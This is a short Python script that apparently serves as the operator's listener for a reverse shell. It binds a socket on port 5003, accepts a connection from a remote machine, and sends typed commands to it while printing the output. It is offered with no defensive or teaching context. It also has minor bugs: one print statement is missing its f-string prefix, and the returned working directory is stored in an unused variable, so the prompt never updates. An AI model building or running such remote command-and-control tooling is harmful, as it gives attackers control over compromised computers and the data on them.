import socket

ser_host = "0.0.0.0"
ser_port = 5003
size = 1024*128

separator = "<sep>"

s = socket.socket()
s.bind((ser_host, ser_port))

s.listen(10)
print("listening as {ser_host}:{ser_port}")

c_socket, addr = s.accept()
print(f"{addr[0]}:{addr[1]} Connected!")

#getting current woring directory
cwd = c_socket.recv(size).decode()
print("[+] Current Working Directory: ", cwd)

while True:
    #getting command from prompt
    command = input(f"{cwd} $> ")
    if not command.strip():
        continue
    
    c_socket.send(command.encode())
    
    if command.lower() == "exit":
        break

    output = c_socket.recv(size).decode()

    results, cnd = output.split(separator)

    print(results)





